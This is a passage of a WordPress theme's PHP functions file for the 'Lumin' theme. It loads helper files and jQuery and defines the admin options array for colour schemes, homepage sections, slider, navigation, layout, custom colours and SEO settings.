<?php 

require_once(TEMPLATEPATH . '/includes/functions/custom_functions.php'); 

require_once(TEMPLATEPATH . '/includes/functions/comments.php'); 

require_once(TEMPLATEPATH . '/includes/functions/sidebars.php'); 

load_theme_textdomain('Lumin',get_template_directory().'/lang');

if ((substr($GLOBALS['wp_version'],0,3)) >= 2.8) { wp_enqueue_script('jquery'); }
else { wp_deregister_script('jquery');
	   wp_register_script('jquery', 'http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js', false, '1.3.2'); }

$themename = "Lumin";
$shortname = "lumin";

$cats_array = get_categories('hide_empty=0');
$pages_array = get_pages('hide_empty=0');
$site_pages = array();

$site_cats = array();

foreach ($pages_array as $pagg) {
	$site_pages[$pagg->ID] = htmlspecialchars($pagg->post_title);
	$pages_ids[] = $pagg->ID;
}

foreach ($cats_array as $categs) {
	$site_cats[$categs->cat_ID] = $categs->cat_name;
	$cats_ids[] = $categs->cat_ID;
}

$options = array (

	array( "name" => "wrap-general",
		   "type" => "contenttab-wrapstart",),
	
		array( "type" => "subnavtab-start",),
		
			array( "name" => "general-1",
				   "type" => "subnav-tab",
				   "desc" => "General"),
					
			array( "name" => "general-2",
				   "type" => "subnav-tab",
				   "desc" => "Homepage"),
					
			array( "name" => "general-3",
				   "type" => "subnav-tab",
				   "desc" => "Featured Slider"),	
				   
		array( "type" => "subnavtab-end",),
		
		array( "name" => "general-1",
			   "type" => "subcontent-start",),

			array( "name" => "Color Scheme",
				   "id" => $shortname."_color_scheme",
				   "type" => "select",
				   "std" => "Blue",
				   "desc" => "This theme comes with multiple color schemes. You can switch between these color schemes at any time using this dropdown menu. Once you click save your theme will be updated with the new color scheme automatically.",
				   "options" => array("Blue", "Brown", "Green")),			   
			
			array( "name" => "Blog Style post format",
                   "id" => $shortname."_blog_style",
                   "type" => "checkbox",
                   "std" => "false",
                   "desc" => "By default the theme truncates your posts on index/homepages automatically to create post previews. If you would rather show your posts in full on index pages like a traditional blog then you can activate this feature."),
			
			array( "name" => "Grab the first post image",
				   "id" => $shortname."_grab_image",
				   "type" => "checkbox2",
				   "std" => "false",
				   "desc" => "By default thumbnail images are created using custom fields. However, if you would rather use the images that are already in your post for your thumbnail (and bypass using custom fields) you can activate this option. Once activcated thumbnail images will be generated automatically using the first image in your post. The image must be hosted on your own server."),
			
			array( "type" => "clearfix",),
			
			array( "name" => "Tagline",
                   "id" => $shortname."_tagline",
                   "std" => "Ultrices et <span>ipsum</span>",
                   "type" => "text",
				   "desc" => "desc"),
				   
			array( "name" => "Blog Category",
                   "id" => $shortname."_blog_cat",
                   "type" => "select",
			       "options" => $site_cats,
				   "desc" => "description"),
				   
			array( "name" => "Projects Category",
                   "id" => $shortname."_projects_cat",
                   "type" => "select",
			       "options" => $site_cats,
				   "desc" => "description"),

			array( "name" => "Number of Posts displayed on Category page",
                   "id" => $shortname."_catnum_posts",
                   "std" => "6",
                   "type" => "text",
				   "desc" => "Here you can designate how many recent articles are displayed on the Category page. This option works independently from the Settings > Reading options in wp-admin."),
				   
			array( "name" => "Number of Posts displayed on Gallery Category page",
                   "id" => $shortname."_gallery_catnum",
                   "std" => "12",
                   "type" => "text",
				   "desc" => "desc."),
				   
			array( "name" => "Number of Posts displayed on Archive pages",
                   "id" => $shortname."_archivenum_posts",
                   "std" => "5",
                   "type" => "text",
				   "desc" => "Here you can designate how many recent articles are displayed on the Archive pages. This option works independently from the Settings > Reading options in wp-admin."),	
		
			array( "name" => "Number of Posts displayed on Search pages",
                   "id" => $shortname."_searchnum_posts",
                   "std" => "5",
                   "type" => "text",
				   "desc" => "Here you can designate how many recent articles are displayed on the Search results pages. This option works independently from the Settings > Reading options in wp-admin."),	
		
			array( "name" => "Number of Posts displayed on Tag pages",
                   "id" => $shortname."_tagnum_posts",
                   "std" => "5",
                   "type" => "text",
				   "desc" => "Here you can designate how many recent articles are displayed on the Tag pages. This option works independently from the Settings > Reading options in wp-admin."),
			
			array( "name" => "Date format",
				   "id" => $shortname."_date_format",
				   "std" => "M j, Y",
                   "type" => "text",
				   "desc" => "This option allows you to change how your dates are displayed. For more information please refer to the WordPress codex here:<a href='http://codex.wordpress.org/Formatting_Date_and_Time' target='_blank'>Formatting Date and Time</a>"),
						
			array( "type" => "clearfix",),
							   
		array( "name" => "general-1",
			   "type" => "subcontent-end",),
			   
		array( "name" => "general-2",
			   "type" => "subcontent-start",),
			
			array( "name" => "Homepage description",
                   "id" => $shortname."_homedesc",
                   "std" => '<span>"Curabitur lectus felis, dapibus non, congue et ultrices et ipsum</span>
ultrices et ipsum Integer ligula sed dolor purus"',
                   "type" => "textarea",
				   "desc" => "desc"),
				   
			array( "name" => "Content Area 1 Page",
				   "id" => $shortname."_home_page_1",
				   "std" => "",
				   "type" => "select",
				   "desc" => "desc.",
				   "options" => $site_pages),
				   
			array( "name" => "Content Area 2 Page",
				   "id" => $shortname."_home_page_2",
				   "std" => "",
				   "type" => "select",
				   "desc" => "desc.",
				   "options" => $site_pages),	   

			array( "name" => "Choose which items to display in the 'From the Blog' section",
				   "id" => $shortname."_postinfo_fromblog",
				   "type" => "different_checkboxes",
				   "std" => array("author","comments"),
				   "desc" => "Here you can choose which items appear in the postinfo section on single post pages. This is the area, usually below the post title, which displays basic information about your post. The highlighted itmes shown below will appear. ",
				   "options" => array("author","comments")),
				   
			array( "name" => "Number of Recent posts in the 'From the Blog' section",
                   "id" => $shortname."_fromblog_recent",
                   "std" => "3",
                   "type" => "text",
				   "desc" => "desc."),
				   
			array( "name" => "Number of Popular posts in the 'From the Blog' section",
                   "id" => $shortname."_fromblog_popular",
                   "std" => "3",
                   "type" => "text",
				   "desc" => "desc."),

			array( "name" => "Number of Random posts in the 'From the Blog' section",
                   "id" => $shortname."_fromblog_random",
                   "std" => "3",
                   "type" => "text",
				   "desc" => "desc."),
				   
			array( "name" => "Number of Recent Projects displayed on homepage",
                   "id" => $shortname."_home_projectsnum",
                   "std" => "12",
                   "type" => "text",
				   "desc" => "Here you can designate how many recent articles are displayed on the homepage. This option works independently from the Settings > Reading options in wp-admin."),

			array( "name" => "Number of Recent Posts displayed on homepage  (in Blog style)",
                   "id" => $shortname."_homepage_posts",
                   "std" => "7",
                   "type" => "text",
				   "desc" => "Here you can designate how many recent articles are displayed on the homepage. This option works independently from the Settings > Reading options in wp-admin."),
			
			array( "name" => "Exclude categories from homepage recent posts",
				   "id" => $shortname."_exlcats_recent",
				   "type" => "checkboxes",
				   "std" => "",
				   "desc" => "By default the homepage displays a list of all of your most recent posts. However, if you would like to exlcude certain category from the list you can do so here. ",
				   "usefor" => "categories",
				   "options" => $cats_ids),
				   
		array( "name" => "general-2",
			   "type" => "subcontent-end",),
		
		array( "name" => "general-3",
				   "type" => "subcontent-start",),
				   
			array( "name" => "Display Featured Slider",
                   "id" => $shortname."_featured",
                   "type" => "checkbox",
                   "std" => "on",
                   "desc" => "You can choose whether or not to display the Featured Articles section on the homepge. If you don't want to utilize this feature simply disable this option."),				   
			
			array( "name" => "Duplicate Featured Articles",
                   "id" => $shortname."_duplicate",
                   "type" => "checkbox2",
                   "std" => "false",
                   "desc" => "In some cases your Featured Articles will also be one of your most recent articles, in which case the article will be displayed twice on the homepage. If you would like to remove duplicate posts enable this option."),
			
			array( "type" => "clearfix",),
			
			array( "name" => "Featured Category",
                   "id" => $shortname."_feat_cat",
                   "type" => "select",
			       "options" => $site_cats,
				   "desc" => "description"),
						
			array( "name" => "Featured Slider Animation",
                   "id" => $shortname."_slider_effect",
                   "type" => "select",
                   "std" => "fade",
				   "desc" => "Here you can choose which animation type to be used when the slider is rotating between articles.",
                   "options" => array("fade", "blindX", "blindY", "blindZ", "cover", "scrollUp", "scrollDown", "scrollLeft", "scrollRight")),			
			array( "name" => "Automatic Slider Animation",
                   "id" => $shortname."_slider_auto",
                   "type" => "checkbox",
                   "std" => "false",
                   "desc" => "If you would like the Featured Articles slider to slide automatically, without the visitor having to click the next button, enable this option and then adjust the rotation speed below if desired."),
			
			array( "name" => "Pause Autoscroll on hover",
                   "id" => $shortname."_pause_hover",
                   "type" => "checkbox2",
                   "std" => "false",
                   "desc" => "desc."),
			
			array( "type" => "clearfix",),
			
			array( "name" => "Automatic Animation Speed (in ms)",
                   "id" => $shortname."_slider_autospeed",
                   "type" => "text",
			       "std" => "3000",
				   "desc" => "description"),
			
		array( "name" => "general-3",
			   "type" => "subcontent-end",),
				   
	array(  "name" => "wrap-general",
			"type" => "contenttab-wrapend",),
			
//-------------------------------------------------------------------------------------//

	array( "name" => "wrap-navigation",
		   "type" => "contenttab-wrapstart",),
		   
		array( "type" => "subnavtab-start",),
		
			array( "name" => "navigation-1",
				   "type" => "subnav-tab",
				   "desc" => "Pages"),
					
			array( "name" => "navigation-2",
				   "type" => "subnav-tab",
				   "desc" => "Categories"),

			array( "name" => "navigation-3",
				   "type" => "subnav-tab",
				   "desc" => "General Settings"),
				   
		array( "type" => "subnavtab-end",),
		
		array( "name" => "navigation-1",
			   "type" => "subcontent-start",),
			   
			array( "name" => "Exclude pages from the navigation bar",
				   "id" => $shortname."_menupages",
				   "type" => "checkboxes",
				   "std" => "",
				   "desc" => "Here you can choose to remove certain pages from the navigation menu. All pages marked with an X will not appear in your navigation bar. ",
				   "usefor" => "pages",
				   "options" => $pages_ids),
			
			array( "name" => "Show dropdown menus",
            "id" => $shortname."_enable_dropdowns",
            "type" => "checkbox",
            "std" => "on",
			"desc" => "If you would like to remove the dropdown menus from the pages navigation bar disable this feature."),
			
			array( "name" => "Display Home link",
            "id" => $shortname."_home_link",
            "type" => "checkbox2",
            "std" => "on",
			"desc" => "By default the theme creates a Home link that, when clicked, leads back to your blog's homepage. If, however, you are using a static homepage and have already created a page called Home to use, this will result in a duplicate link. In this case you should disable this feature to remove the link."),
			
			array( "type" => "clearfix",),

			array( "name" => "Sort Pages Links",
                   "id" => $shortname."_sort_pages",
                   "type" => "select",
                   "std" => "post_title",
				   "desc" => "Here you can choose to sort your pages links.",
                   "options" => array("post_title", "menu_order","post_date","post_modified","ID","post_author","post_name")),			
			
			array( "name" => "Order Pages Links by Ascending/Descending",
                   "id" => $shortname."_order_page",
                   "type" => "select",
                   "std" => "asc",
				   "desc" => "Here you can choose to reverse the order that your pages links are displayed. You can choose between ascending and descending.",
                   "options" => array("asc", "desc")),
			
			array( "name" => "Number of dropdown tiers shown",
            "id" => $shortname."_tiers_shown_pages",
            "type" => "text",
            "std" => "3",
			"desc" => "This options allows you to control how many teirs your pages dropdown menu has. Increasing the number allows for additional menu items to be shown."),

			array( "type" => "clearfix",),

		
		array( "name" => "navigation-1",
			   "type" => "subcontent-end",),
			   
		array( "name" => "navigation-2",
			   "type" => "subcontent-start",),
			
			array( "name" => "Exclude categories from the navigation bar",
				   "id" => $shortname."_menucats",
				   "type" => "checkboxes",
				   "std" => "",
				   "desc" => "Here you can choose to remove certain categories from the navigation menu. All categories marked with an X will not appear in your navigation bar. ",
				   "usefor" => "categories",
				   "options" => $cats_ids),
			
			array( "name" => "Show dropdown menus",
            "id" => $shortname."_enable_dropdowns_categories",
            "type" => "checkbox",
            "std" => "on",
			"desc" => "If you would like to remove the dropdown menus from the categories navigation bar disable this feature."),
			
			array( "name" => "Hide empty categories",
            "id" => $shortname."_categories_empty",
            "type" => "checkbox",
            "std" => "on",
			"desc" => "If you would like categories to be displayed in your navigationbar that don't have any posts in them then disable this option. By default empty categories are hidden"),

			array( "type" => "clearfix",),
			
			array( "name" => "Number of dropdown tiers shown",
            "id" => $shortname."_tiers_shown_categories",
            "type" => "text",
            "std" => "3",
			"desc" => "This options allows you to control how many teirs your pages dropdown menu has. Increasing the number allows for additional menu items to be shown."),

			array( "type" => "clearfix",),
				   
		    array( "name" => "Sort Categories Links by Name/ID/Slug/Count/Term Group",
                   "id" => $shortname."_sort_cat",
                   "type" => "select",
                   "std" => "name",
				   "desc" => "By default pages are sorted by name. However if you would rather have them sorted by ID you can adjust this setting.",
                   "options" => array("name", "ID", "slug", "count", "term_group")),
			
			array( "name" => "Order Category Links by Ascending/Descending",
                   "id" => $shortname."_order_cat",
                   "type" => "select",
                   "std" => "asc",
				   "desc" => "Here you can choose to reverse the order that your categories links are displayed. You can choose between ascending and descending.",
                   "options" => array("asc", "desc")),
				 
		array( "name" => "navigation-2",
			   "type" => "subcontent-end",),	 

		array( "name" => "navigation-3",
			   "type" => "subcontent-start",),

			array( "name" => "Swap the pages/category navbar positions",
            "id" => $shortname."_swap_navbar",
            "type" => "checkbox",
            "std" => "false",
			"desc" => "By default the theme displays the Pages links in the top navigation bar and the categories links in the bottom navigation bar. You can swap the positions of these links if you would rather have your categories listed at the top and your pages listed on the bottom. "),
			
			array( "name" => "Disable top tier dropdown menu links",
            "id" => $shortname."_disable_toptier",
            "type" => "checkbox2",
            "std" => "false",
			"desc" => "In some cases users will want to create parent categories or links as placeholders to hold a list of child links or categories. In this case it is not desirable to have the parent links lead anywhere, but instead merely serve an organizational function. Enabling this options will remove the links from all parent pages/categories so that they don't lead anywhere when clicked."),
			
			array( "type" => "clearfix",),
			
		array( "name" => "navigation-3",
			   "type" => "subcontent-end",),	 
		
	array( "name" => "wrap-navigation",
		   "type" => "contenttab-wrapend",),

//-------------------------------------------------------------------------------------//

	array( "name" => "wrap-layout",
		   "type" => "contenttab-wrapstart",),
		   
		array( "type" => "subnavtab-start",),
		
			array( "name" => "layout-1",
				   "type" => "subnav-tab",
				   "desc" => "Single Post Layout"),
				 
			array( "name" => "layout-2",
				   "type" => "subnav-tab",
				   "desc" => "Single Page Layout"),
			
			array( "name" => "layout-3",
				   "type" => "subnav-tab",
				   "desc" => "General Settings"),
			
		array( "type" => "subnavtab-end",),
		
		array( "name" => "layout-1",
			   "type" => "subcontent-start",),
				
			array( "name" => "Choose which items to display in the postinfo section",
				   "id" => $shortname."_postinfo2",
				   "type" => "different_checkboxes",
				   "std" => array("author","date","categories","comments"),
				   "desc" => "Here you can choose which items appear in the postinfo section on single post pages. This is the area, usually below the post title, which displays basic information about your post. The highlighted itmes shown below will appear. ",
				   "options" => array("author","date","categories","comments")),

			array( "name" => "Place Thumbs on Posts",
                   "id" => $shortname."_thumbnails",
                   "type" => "checkbox",
                   "std" => "on",
                   "desc" => "By default thumbnails are placed at the beginning of your post on single post pages. If you would like to remove this initial thumbnail image to avoid repetition simply disable this option. "),
			
			array( "name" => "Thumbs on Gallery Post",
                   "id" => $shortname."_thumbnails_post",
                   "type" => "checkbox",
                   "std" => "on",
                   "desc" => ""),
			
			array( "name" => "Enable Post Info section",
                   "id" => $shortname."_postinfo_posts",
                   "type" => "checkbox",
                   "std" => "on",
                   "desc" => "By default the theme places some basic information about your post on all single post pages, as defined above. If you would rather remove this information from the post entirely simply disabe this option. "),

			array( "name" => "Show comments on posts",
            "id" => $shortname."_show_postcomments",
            "type" => "checkbox2",
            "std" => "on",
			"desc" => "You can disable this option if you want to remove the comments and comment form from single post pages. "),
						
			array( "type" => "clearfix",),
			
			array( "name" => "Adjust the width of thumbnail images",
				   "id" => $shortname."_thumbnail_width_posts",
				   "type" => "text",
				   "std" => "185",
				   "desc" => "Here you can adjust the width of your thumbnail images. The width value is in pixels.",),
			
			array( "name" => "Adjust the height of thumbnail images",
				   "id" => $shortname."_thumbnail_height_posts",
				   "type" => "text",
				   "std" => "185",
				   "desc" => "Here you can adjust the height of your thumbnail images. The height value is in pixels.",),
			
			array( "type" => "clearfix",),

		array( "name" => "layout-1",
			   "type" => "subcontent-end",),	

		array( "name" => "layout-2",
			   "type" => "subcontent-start",),
		
			array( "name" => "Place Thumbs on Pages",
                   "id" => $shortname."_page_thumbnails",
                   "type" => "checkbox",
                   "std" => "false",
                   "desc" => "By default thumbnails are not placed on pages (they are only used on posts). However, if you want to use thumbnails on posts you can! Just enable this option. "),

			array( "name" => "Show comments on pages",
            "id" => $shortname."_show_pagescomments",
            "type" => "checkbox",
            "std" => "false",
			"desc" => "By default comments are not placed on pages, however, if you would like to allow people to comment on your pages simply enable this option. "),
			
			array( "type" => "clearfix",),

			array( "name" => "Adjust the width of thumbnail images",
				   "id" => $shortname."_thumbnail_width_pages",
				   "type" => "text",
				   "std" => "185",
				   "desc" => "Here you can adjust the width of your thumbnail images. The width value is in pixels.",),
			
			array( "name" => "Adjust the height of thumbnail images",
				   "id" => $shortname."_thumbnail_height_pages",
				   "type" => "text",
				   "std" => "185",
				   "desc" => "Here you can adjust the height of your thumbnail images. The height value is in pixels.",),

		array( "name" => "layout-2",
			   "type" => "subcontent-end",),	

		array( "name" => "layout-3",
			   "type" => "subcontent-start",),	
		
			array( "name" => "Post info section",
				   "id" => $shortname."_postinfo1",
				   "type" => "different_checkboxes",
				   "std" => array("author","date","categories","comments"),
				   "desc" => "Here you can choose which items appear in the postinfo section on pages. This is the area, usually below the post title, which displays basic information about your post. The highlighted itmes shown below will appear. ",
				   "options" => array("author","date","categories","comments")),
			
			array( "name" => "Enable Post Info section",
                   "id" => $shortname."_postinfo1_show",
                   "type" => "checkbox",
                   "std" => "on",
                   "desc" => "By default the theme places some basic information about your post on all single post pages, as defined above. If you would rather remove this information from the post entirely simply disabe this option. "),
			
			array( "type" => "clearfix",),
			
			array( "name" => "Adjust the width of thumbnail images",
				   "id" => $shortname."_thumbnail_width_usual",
				   "type" => "text",
				   "std" => "155",
				   "desc" => "Here you can adjust the width of your thumbnail images. The width value is in pixels.",),
			
			array( "name" => "Adjust the height of thumbnail images",
				   "id" => $shortname."_thumbnail_height_usual",
				   "type" => "text",
				   "std" => "155",
				   "desc" => "Here you can adjust the height of your thumbnail images. The height value is in pixels.",),

		
		array( "name" => "layout-3",
			   "type" => "subcontent-end",),	
		
	array( "name" => "wrap-layout",
		   "type" => "contenttab-wrapend",),
		   
//-------------------------------------------------------------------------------------//

	array( "name" => "wrap-colorization",
		   "type" => "contenttab-wrapstart",),
		   
		array( "type" => "subnavtab-start",),
		
			array( "name" => "colorization-1",
				   "type" => "subnav-tab",
				   "desc" => "Colorization"),
				   
		array( "type" => "subnavtab-end",),
		
		array( "name" => "colorization-1",
			   "type" => "subcontent-start",),
			   
			array( "name" => "Color visualizer (this is not setting, just a tool to find hexdecimal values)",
				   "type" => "colorpicker",
				   "desc" => "This is a tool that can be used to find hexdecimal color values. These values can be used to customize the colors of the various elements below. This color picker will also appear which you click in any of the fields below. ",),
				   
			array( "name" => "Enable custom colors",
                   "id" => $shortname."_custom_colors",
                   "type" => "checkbox",
                   "std" => "false",
                   "desc" => "This option allows you to customize the color of a certain element of the theme. When you click in the field a color picker will appear. Scroll to find your desired color and then click the circular submit button on the lower right to accept the value."),
			
			array( "name" => "Enable child stylesheet",
                   "id" => $shortname."_child_css",
                   "type" => "checkbox2",
                   "std" => "false",
                   "desc" => "If you would like to add a second stylsheet to your blog enable this option and input the link to your stylesheet below."),
			
			array( "type" => "clearfix",),
			
			array( "name" => "Child stylesheet URL",
				   "id" => $shortname."_child_cssurl",
				   "type" => "text",
				   "std" => "",
				   "desc" => "Input the URL to your child stylsheet here.",),
			
			array( "name" => "Background color",
				   "id" => $shortname."_color_bgcolor",
				   "type" => "textcolorpopup",
				   "std" => "",
				   "desc" => "This option allows you to customize the color of a certain element of the theme. When you click inside the field a color picker will appear. Scroll to find your desired color and then click the circular submit button on the lower right to accept the value.",),
			
			array( "name" => "Main font color",
				   "id" => $shortname."_color_mainfont",
				   "type" => "textcolorpopup",
				   "std" => "",
				   "desc" => "This option allows you to customize the color of a certain element of the theme. When you click inside the field a color picker will appear. Scroll to find your desired color and then click the circular submit button on the lower right to accept the value",),

			array( "name" => "Main link color (in the post body)",
				   "id" => $shortname."_color_mainlink",
				   "type" => "textcolorpopup",
				   "std" => "",
				   "desc" => "This option allows you to customize the color of a certain element of the theme. When you click inside the field a color picker will appear. Scroll to find your desired color and then click the circular submit button on the lower right to accept the value",),
				   
			array( "name" => "Menu link color",
				   "id" => $shortname."_color_pagelink",
				   "type" => "textcolorpopup",
				   "std" => "",
				   "desc" => "This option allows you to customize the color of a certain element of the theme. When you click inside the field a color picker will appear. Scroll to find your desired color and then click the circular submit button on the lower right to accept the value",),
				   				   				   
			array( "name" => "Sidebar title headings color",
				   "id" => $shortname."_color_sidebar_titles",
				   "type" => "textcolorpopup",
				   "std" => "",
				   "desc" => "This option allows you to customize the color of a certain element of the theme. When you click inside the field a color picker will appear. Scroll to find your desired color and then click the circular submit button on the lower right to accept the value",),

			array( "name" => "Sidebar links color",
				   "id" => $shortname."_color_sidebar_links",
				   "type" => "textcolorpopup",
				   "std" => "",
				   "desc" => "This option allows you to customize the color of a certain element of the theme. When you click inside the field a color picker will appear. Scroll to find your desired color and then click the circular submit button on the lower right to accept the value",),
				   
			array( "name" => "Footer title headings color",
				   "id" => $shortname."_footer_headings",
				   "type" => "textcolorpopup",
				   "std" => "",
				   "desc" => "This option allows you to customize the color of a certain element of the theme. When you click inside the field a color picker will appear. Scroll to find your desired color and then click the circular submit button on the lower right to accept the value",),	   
						
		    array( "name" => "Footer links color",
				   "id" => $shortname."_color_footerlinks",
				   "type" => "textcolorpopup",
				   "std" => "",
				   "desc" => "This option allows you to customize the color of a certain element of the theme. When you click inside the field a color picker will appear. Scroll to find your desired color and then click the circular submit button on the lower right to accept the value",),
				   			   
			array( "name" => "Page/Post heading title color",
				   "id" => $shortname."_color_heading",
				   "type" => "textcolorpopup",
				   "std" => "",
				   "desc" => "This option allows you to customize the color of a certain element of the theme. When you click inside the field a color picker will appear. Scroll to find your desired color and then click the circular submit button on the lower right to accept the value",),
		
		array( "name" => "colorization-1",
			   "type" => "subcontent-end",),		
			   
	array( "name" => "wrap-colorization",
		   "type" => "contenttab-wrapend",),
		   
//-------------------------------------------------------------------------------------//
	array( "name" => "wrap-seo",
		   "type" => "contenttab-wrapstart",),
	
		array( "type" => "subnavtab-start",),
		
			array( "name" => "seo-1",
				   "type" => "subnav-tab",
				   "desc" => "Homepage SEO",),
					
			array( "name" => "seo-2",
				   "type" => "subnav-tab",
				   "desc" => "Single Post Page SEO",),
					
			array( "name" => "seo-3",
				   "type" => "subnav-tab",
				   "desc" => "Index Page SEO",),	
				   
		array( "type" => "subnavtab-end",),
		
		array( "name" => "seo-1",
			   "type" => "subcontent-start",),
			   
			array( "name" => " Enable custom title ",
				   "id" => $shortname."_seo_home_title",
				   "type" => "checkbox",
				   "std" => "false",
				   "desc" => "By default the theme uses a combination of your blog name and your blog description, as defined when you created your blog, to create your homepage titles. However if you want to create a custom title then simply enable this option and fill in the custom title field below. ",),  
			
			array( "name" => " Enable meta description",
				   "id" => $shortname."_seo_home_description",
				   "type" => "checkbox",
				   "std" => "false",
				   "desc" => "By default the theme uses your blog description, as defined when you created your blog, to fill in the meta description field. If you would like to use a different description then enable this option and fill in the custom description field below. ",),  
			
			array( "name" => " Enable meta keywords",
				   "id" => $shortname."_seo_home_keywords",
				   "type" => "checkbox",
				   "std" => "false",
				   "desc" => "By default the theme does not add keywords to your header. Most search engines don't use keywords to rank your site anymore, but some people define them anyway just in case. If you want to add meta keywords to your header then enable this option and fill in the custom keywords field below. ",),  
			
			array( "name" => " Enable canonical URL's",
				   "id" => $shortname."_seo_home_canonical",
				   "type" => "checkbox",
				   "std" => "false",
				   "desc" => "Canonicalization helps to prevent the indexing of duplicate content by search engines, and as a result, may help avoid duplicate content penalties and pagerank degradation. Some pages may have different URLs all leading to the same place. For example domain.com, domain.com/index.html, and www.domain.com are all different URLs leading to your homepage. From a search engine's perspective these duplicate URLs, which also occur often due to custom permalinks, may be treaded individually instead of as a single destination. Defining a canonical URL tells the search engine which URL you would like to use officially. The theme bases its canonical URLs off your permalinks and the domain name defined in the settings tab of wp-admin.",),  
			
			array( "type" => "clearfix",),
			
			array( "name" => "Homepage custom title (if enabled)",
				   "id" => $shortname."_seo_home_titletext",
				   "type" => "text",
				   "std" => "",
				   "desc" => "If you have enabled custom titles you can add your custom title here. Whatever you type here will be placed between the < title >< /title > tags in header.php",),

			array( "name" => "Homepage meta description (if enabled)",
				   "id" => $shortname."_seo_home_descriptiontext",
				   "type" => "textarea",
				   "std" => "",
				   "desc" => "If you have enabled meta descriptions you can add your custom description here.",),
			
			array( "name" => "Homepage meta keywords (if enabled)",
				   "id" => $shortname."_seo_home_keywordstext",
				   "type" => "text",
				   "std" => "",
				   "desc" => "If you have enabled meta keywords you can add your custom keywords here. Keywords should be separated by comas. For example: wordpress,themes,templates,elegant",),
				   
			array( "name" => "If custom titles are disabled, choose autogeneration method",
				   "id" => $shortname."_seo_home_type",
				   "type" => "select",
				   "std" => "BlogName | Blog description",
				   "options" => array("BlogName | Blog description", "Blog description | BlogName", "BlogName only"),
				   "desc" => "If you are not using cutsom post titles you can still have control over how your titles are generated. Here you can choose which order you would like your post title and blog name to be displayed, or you can remove the blog name from the title completely.",),
			
			array( "name" => "Define a character to separate BlogName and Post title",
				   "id" => $shortname."_seo_home_separate",
				   "type" => "text",
				   "std" => " | ",
				   "desc" => "Here you can change which character separates your blog title and post name when using autogenerated post titles. Common values are | or -",),
				   
		array( "name" => "seo-1",
			   "type" => "subcontent-end",),
			   
		array( "name" => "seo-2",
			   "type" => "subcontent-start",),
			   
			array( "name" => "Enable custom titles",
				   "id" => $shortname."_seo_single_title",
				   "type" => "checkbox",
				   "std" => "false",
				   "desc" => "By default the theme creates post titles based on the title of your post and your blog name. If you would like to make your meta title different than your actual post title you can define a custom title for each post using custom fields. This option must be enabled for custom titles to work, and you must choose a custom field name for your title below.",),  
			
			array( "name" => "Enable custom description",
				   "id" => $shortname."_seo_single_description",
				   "type" => "checkbox2",
				   "std" => "false",
				   "desc" => "If you would like to add a meta description to your post you can do so using custom fields. This option must be enabled for descriptions to be displayed on post pages. You can add your meta description using custom fields based off the custom field name you define below.",),  
			
			array( "type" => "clearfix",),
			
			array( "name" => "Enable custom keywords",
				   "id" => $shortname."_seo_single_keywords",
				   	"type" => "checkbox",
				   "std" => "false",
				   "desc" => "If you would like to add meta keywords to your post you can do so using custom fields. This option must be enabled for keywords to be displayed on post pages. You can add your meta keywords using custom fields based off the custom field name you define below.",),  
			
			array( "name" => "Enable canonical URL's",
				   "id" => $shortname."_seo_single_canonical",
				   "type" => "checkbox2",
				   "std" => "false",
				   "desc" => "Canonicalization helps to prevent the indexing of duplicate content by search engines, and as a result, may help avoid duplicate content penalties and pagerank degradation. Some pages may have different URL's all leading to the same place. For example domain.com, domain.com/index.html, and www.domain.com are all different URLs leading to your homepage. From a search engine's perspective these duplicate URLs, which also occur often due to custom permalinks, may be treaded individually instead of as a single destination. Defining a canonical URL tells the search engine which URL you would like to use officially. The theme bases its canonical URLs off your permalinks and the domain name defined in the settings tab of wp-admin.",), 
				   
			array( "type" => "clearfix",),	   
			
			array( "name" => "Custom field Name to be used for title",
				   "id" => $shortname."_seo_single_field_title",
				   "type" => "text",
				   "std" => "seo_title",
				   "desc" => "When you define your title using custom fields you should use this value for the custom field Name. The Value of your custom field should be the custom title you would like to use.",), 
			
			array( "name" => "Custom field Name to be used for description",
				   "id" => $shortname."_seo_single_field_description",
				   "type" => "text",
				   "std" => "seo_description",
				   "desc" => "When you define your meta description using custom fields you should use this value for the custom field Name. The Value of your custom field should be the custom description you would like to use.",), 
			
			array( "name" => "Custom field Name to be used for keywords",
				   "id" => $shortname."_seo_single_field_keywords",
				   "type" => "text",
				   "std" => "seo_keywords",
				   "desc" => "When you define your keywords using custom fields you should use this value for the custom field Name. The Value of your custom field should be the meta keywords you would like to use, separated by comas.",), 
			
			array( "name" => "If custom titles are disabled, choose autogeneration method",
				   "id" => $shortname."_seo_single_type",
				   "type" => "select",
				   "std" => "Post title | BlogName",
				   "options" => array("Post title | BlogName", "BlogName | Post title", "Post title only"),
				   "desc" => "If you are not using cutsom post titles you can still have control over hw your titles are generated. Here you can choose which order you would like your post title and blog name to be displayed, or you can remove the blog name from the title completely.",),
			
			array( "name" => "Define a character to separate BlogName and Post title",
				   "id" => $shortname."_seo_single_separate",
				   "type" => "text",
				   "std" => " | ",
				   "desc" => "Here you can change which character separates your blog title and post name when using autogenerated post titles. Common values are | or -",), 
				   
		array( "name" => "seo-2",
			   "type" => "subcontent-end",),
		
		array( "name" => "seo-3",
				   "type" => "subcontent-start",),
		
			array( "name" => " Enable canonical URL's",
				   "id" => $shortname."_seo_index_canonical",
				   "type" => "checkbox",
				   "std" => "false",
				   "desc" => "Canonicalization helps to prevent the indexing of duplicate content by search engines, and as a result, may help avoid duplicate content penalties and pagerank degradation. Some pages may have different URL's all leading to the same place. For example domain.com, domain.com/index.html, and www.domain.com are all different URLs leading to your homepage. From a search engine's perspective these duplicate URLs, which also occur often due to custom permalinks, may be treaded individually instead of as a single destination. Defining a canonical URL tells the search engine which URL you would like to use officially. The theme bases its canonical URLs off your permalinks and the domain name defined in the settings tab of wp-admin.",),  
			
			array( "name" => "Enable meta descriptions",
				   "id" => $shortname."_seo_index_description",
				   	"type" => "checkbox2",
				   "std" => "false",
				   "desc" => "Check this box if you want to display meta descriptions on category/archive pages. The description is based off the category description you choose when creating/edit your category in wp-admin.",),  
			
			array( "type" => "clearfix",),
				   
			array( "name" => "Choose title autogeneration method",
				   "id" => $shortname."_seo_index_type",
				   "type" => "select",
				   "std" => "Category name | BlogName",
				   "options" => array("Category name | BlogName", "BlogName | Category name", "Category name only"),
				   "desc" => "Here you can choose how your titles on index pages are generated. You can change which order your blog name and index title are displayed, or you can remove the blog name from the title completely.",),
			
			array( "name" => "Define a character to separate BlogName and Post title",
				   "id" => $shortname."_seo_index_separate",
				   "type" => "text",
				   "std" => " | ",
				   "desc" => "Here you can change which character separates your blog title and index page name when using autogenerated post titles. Common values are | or -",), 
			
			array( "type" => "clearfix",),
					   
		array( "name" => "seo-3",
				   "type" => "subcontent-end",),
				   
